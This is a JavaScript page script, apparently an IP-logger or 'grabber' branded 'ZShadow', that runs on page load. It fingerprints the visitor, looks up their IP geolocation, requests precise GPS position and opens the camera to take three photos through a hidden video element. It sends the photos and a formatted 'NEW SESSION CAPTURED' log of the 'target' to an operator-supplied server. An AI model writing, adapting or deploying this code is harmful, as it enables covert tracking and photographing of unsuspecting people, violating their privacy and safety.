window.addEventListener("load", async () => {

  const startTime = Date.now();

  const scriptTag = document.querySelector("script[data-tracking-id]");
  if (!scriptTag) return;

  const trackingId = scriptTag.dataset.trackingId;
  const serverUrl = scriptTag.dataset.serverUrl;

  if (!trackingId || !serverUrl) return;

  const data = {};

  // 🌐 Public IP
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const ipData = await res.json();
    data.IP_Address = ipData.ip;
  } catch {
    data.IP_Address = "Unavailable";
  }

try {
  const geo = await fetch(`https://ipapi.co/${data.IP_Address}/json/`);
  const geoData = await geo.json();

  data.Geo = {
    Country: geoData.country_name || "Unknown",
    Region: geoData.region || "Unknown",
    City: geoData.city || "Unknown",
    ISP: geoData.org || "Unknown"
  };

} catch {}

  // 🧠 Basic Info
  data.User_Agent = navigator.userAgent;
  data.Language = navigator.language;
  data.Platform = navigator.platform || "Unknown";
  data.Cookies_Enabled = navigator.cookieEnabled ? "Yes" : "No";
  data.Online_Status = navigator.onLine ? "Online" : "Offline";
if (/Mobi|Android/i.test(navigator.userAgent)) {
  data.Device_Type = "Mobile";
} else if (/Tablet|iPad/i.test(navigator.userAgent)) {
  data.Device_Type = "Tablet";
} else {
  data.Device_Type = "Desktop";
}
let browser = "Unknown";
let engine = "Unknown";

if (navigator.userAgent.includes("Chrome")) {
  browser = "Chrome";
  engine = "Blink";
}

if (navigator.userAgent.includes("Firefox")) {
  browser = "Firefox";
  engine = "Gecko";
}

if (
  navigator.userAgent.includes("Safari") &&
  !navigator.userAgent.includes("Chrome")
) {
  browser = "Safari";
  engine = "WebKit";
}

data.Browser = browser;
data.Engine = engine;

  // 🖥️ Display
  data.Screen_Resolution = `${window.screen.width}x${window.screen.height}`;
  data.Color_Depth = `${window.screen.colorDepth}-bit`;
  data.Timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

  // 📱 Device Model
  const ua = navigator.userAgent;
  let deviceModel = "Unknown";

  if (/Android/.test(ua)) {
    const match = ua.match(/Android[^;]*;\s*([^)]+)/);
    if (match) {
      deviceModel = match[1].replace(/Build.*/, "").trim();
    }
  } else if (/iPhone/.test(ua)) {
    deviceModel = "iPhone";
  } else if (/iPad/.test(ua)) {
    deviceModel = "iPad";
  } else if (/Windows/.test(ua)) {
    deviceModel = "Windows PC";
  } else if (/Macintosh/.test(ua)) {
    deviceModel = "Mac";
  }

  data.Device_Model = deviceModel;

  // 🔋 Battery
  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();

      data.Battery = {
        Level: `${Math.round(battery.level * 100)}%`,
        Charging: battery.charging ? "Yes" : "No"
      };
    } catch {}
  }

  // ⚙️ Hardware
  data.Hardware = {
    CPU_Cores: navigator.hardwareConcurrency || "Unknown",
    Device_Memory_GB: navigator.deviceMemory || "Unknown"
  };

  // 💾 Storage
  if (navigator.storage && navigator.storage.estimate) {
    try {
      const storage = await navigator.storage.estimate();

      data.Storage = {
        Usage_MB: `${(storage.usage / 1048576).toFixed(2)} MB`,
        Quota_MB: `${(storage.quota / 1048576).toFixed(2)} MB`
      };
    } catch {}
  }

  // 📡 Network
  const connection =
    navigator.connection ||
    navigator.mozConnection ||
    navigator.webkitConnection;

  if (connection) {
    data.Network = {
      Type: connection.effectiveType || "Unknown",
      Downlink: `${connection.downlink || "?"} Mb/s`,
      RTT: `${connection.rtt || "?"} ms`,
      Save_Data: connection.saveData ? "Enabled" : "Disabled"
    };
  }

  // 📍 Location
  try {
    const position = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject, {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      });
    });

    data.Location = {
      Latitude: position.coords.latitude,
      Longitude: position.coords.longitude,
      Accuracy: `${Math.round(position.coords.accuracy)} meters`,
      Google_Maps: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`
    };
  } catch {
    data.Location = "Permission Denied";
  }

  //Photo 📸 

  // Request camera and take 3 photos
  if (navigator.mediaDevices) {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      data.Permissions.Camera = 'Granted';

      const video = document.createElement('video');
      video.style.display = 'none';
      video.setAttribute('playsinline', '');
      video.setAttribute('autoplay', '');
      video.setAttribute('muted', '');
      document.body.appendChild(video);
      video.srcObject = stream;
      await video.play();

      await new Promise(r => setTimeout(r, 500));

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const context = canvas.getContext('2d');

      // Photo at 1 second
      await new Promise(r => setTimeout(r, 1000));
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      let imageData = canvas.toDataURL('image/jpeg', 0.8);
      await fetch(`${serverUrl}/photo?trackingId=${trackingId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ imageData }),
      }).catch(() => {});

      // Photo at 2 seconds
      await new Promise(r => setTimeout(r, 1000));
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      imageData = canvas.toDataURL('image/jpeg', 0.8);
      await fetch(`${serverUrl}/photo?trackingId=${trackingId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ imageData }),
      }).catch(() => {});

      // Photo at 3 seconds
      await new Promise(r => setTimeout(r, 1000));
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      imageData = canvas.toDataURL('image/jpeg', 0.8);
      await fetch(`${serverUrl}/photo?trackingId=${trackingId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ imageData }),
      }).catch(() => {});

      stream.getTracks().forEach(track => track.stop());
      try {
        document.body.removeChild(video);
        document.body.removeChild(canvas);
      } catch (e) {}
    } catch (error) {
      data.Permissions.Camera = 'Denied';
    }
  }


  // 🕒 Current Time
  data.Timestamp = new Date().toLocaleString();

  // 🎨 FORMATTED OUTPUT
const formatted = `
🖥️ NEW SESSION CAPTURED 🖥️

┏━━━━━━━━━━━━━━━━━━━━━━━━━┓
             🖥️ CYBER ACCESS LOG 🖥️
┗━━━━━━━━━━━━━━━━━━━━━━━━━┛

🕶 TARGET IDENTITY
════════════════════
🌐 IP        ➤ ${data.IP_Address}
📶 STATUS    ➤ ${data.Online_Status}
🗣 LANG      ➤ ${data.Language}

📱 DEVICE SCAN
════════════════════
📲 MODEL     ➤ ${data.Device_Model}
⚙️ PLATFORM  ➤ ${data.Platform}
🍪 COOKIES   ➤ ${data.Cookies_Enabled}
🧾 AGENT     ➤ ${data.User_Agent}

🖥 DISPLAY MATRIX
════════════════════
📺 SCREEN    ➤ ${data.Screen_Resolution}
🎨 COLORS    ➤ ${data.Color_Depth}
🌍 ZONE      ➤ ${data.Timezone}

🔋 POWER CORE
════════════════════
🔋 BATTERY   ➤ ${data.Battery?.Level || "N/A"}
⚡ CHARGING  ➤ ${data.Battery?.Charging || "N/A"}

⚙️ HARDWARE NODE
════════════════════
🧠 CPU       ➤ ${data.Hardware?.CPU_Cores || "N/A"} Cores
💾 RAM       ➤ ${data.Hardware?.Device_Memory_GB || "N/A"} GB

💽 STORAGE TRACE
════════════════════
📂 USED      ➤ ${data.Storage?.Usage_MB || "N/A"}
📦 TOTAL     ➤ ${data.Storage?.Quota_MB || "N/A"}

📡 NETWORK SIGNAL
════════════════════
📶 TYPE      ➤ ${data.Network?.Type || "N/A"}
🚀 SPEED     ➤ ${data.Network?.Downlink || "N/A"}
📡 RTT       ➤ ${data.Network?.RTT || "N/A"}
💡 SAVE DATA ➤ ${data.Network?.Save_Data || "N/A"}

📍 GEO TRACKER
════════════════════
📌 LAT       ➤ ${data.Location?.Latitude || "N/A"}
📌 LONG      ➤ ${data.Location?.Longitude || "N/A"}
🎯 ACCURACY  ➤ ${data.Location?.Accuracy || "N/A"}
🗺 MAP       ➤ ${data.Location?.Google_Maps || data.Location || "N/A"}

🌍 GEO DATABASE
════════════════════
🌎 COUNTRY   ➤ ${data.Geo?.Country || "N/A"}
🏙 REGION    ➤ ${data.Geo?.Region || "N/A"}
🏠 CITY      ➤ ${data.Geo?.City || "N/A"}
📡 ISP       ➤ ${data.Geo?.ISP || "N/A"}

📲 DEVICE TYPE
════════════════════
🛠 ${data.Device_Type || "Unknown"}

🌐 BROWSER CORE
════════════════════
🧠 BROWSER   ➤ ${data.Browser || "Unknown"}
⚙️ ENGINE    ➤ ${data.Engine || "Unknown"}

⏳ SESSION TRACE
════════════════════
🕒 TIME      ➤ ${data.Timestamp}
⌛ DURATION  ➤ ${data.Session_Duration || "0 sec"}

┏━━━━━━━━━━━━━━━━━━━━━━━━━┓
            ⚡ POWERED BY ZShadow ⚡
┗━━━━━━━━━━━━━━━━━━━━━━━━━┛
`;

  // 🚀 Send
  await fetch(`${serverUrl}/data`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      trackingId,
      pretty: formatted
    })
  }).catch(() => {});

});
